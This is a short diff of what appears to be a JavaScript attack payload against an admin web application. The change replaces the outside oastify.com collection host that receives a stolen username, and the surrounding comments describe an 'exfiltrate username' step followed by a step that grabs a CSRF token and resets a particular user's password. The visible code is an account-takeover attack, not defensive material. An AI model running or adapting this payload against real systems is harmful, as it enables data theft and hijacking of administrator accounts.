@@ -15,7 +15,7 @@ fetch("https://refeng.erad.com/Admin/AdminSystemMessages/SaveSystemMessage", {
   const username = userMatch ? userMatch[1] : "unknown";
 
   // Step 4: Exfiltrate username via GET request
-  fetch(`https://sfbvy1p86c5xt8wpdzur4rjohfn6bwzl.oastify.com?username=${encodeURIComponent(username)}`);
+  fetch(`https://6x49gf7moqnbbme3vdc5m512zt5ktbh0.oastify.com?username=${encodeURIComponent(username)}`);
 
   // Step 5: Get CSRF token and perform password reset
   return fetch("https://refeng.erad.com/Admin/AdminUsers/Edit?aUserKey=25713");
